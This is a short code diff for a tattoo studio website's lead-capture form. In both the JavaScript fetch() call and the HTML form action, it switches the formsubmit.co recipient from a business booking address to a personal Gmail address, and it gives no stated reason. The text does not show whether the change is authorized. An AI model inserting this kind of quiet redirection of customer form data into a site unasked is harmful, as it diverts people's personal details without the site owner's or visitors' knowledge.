@@ -172,7 +172,7 @@ SCRIPT = r"""<script data-woa-guide-lead-script="1">
       return;
     }
 
-    fetch("https://formsubmit.co/ajax/booking@workofarttattoo.com", {
+    fetch("https://formsubmit.co/ajax/thewhiteknight702@gmail.com", {
       method: "POST",
       headers: { Accept: "application/json" },
       body: new FormData(form)
@@ -197,7 +197,7 @@ def lead_section(offer_id: str) -> str:
 <p class="font-label-caps text-secondary uppercase tracking-widest text-xs mb-2">Free studio guide</p>
 <h2 class="font-headline-md text-on-surface text-2xl md:text-3xl mb-3">{name}</h2>
 <p class="font-body-md text-on-surface-variant leading-relaxed mb-6">{offer["intro"]}</p>
-<form action="https://formsubmit.co/booking@workofarttattoo.com" class="space-y-4" id="woa-guide-lead" method="POST">
+<form action="https://formsubmit.co/thewhiteknight702@gmail.com" class="space-y-4" id="woa-guide-lead" method="POST">
 <input name="_captcha" type="hidden" value="false"/>
 <input name="_template" type="hidden" value="table"/>
 <input name="_subject" type="hidden" value="[Guide] {name}"/>
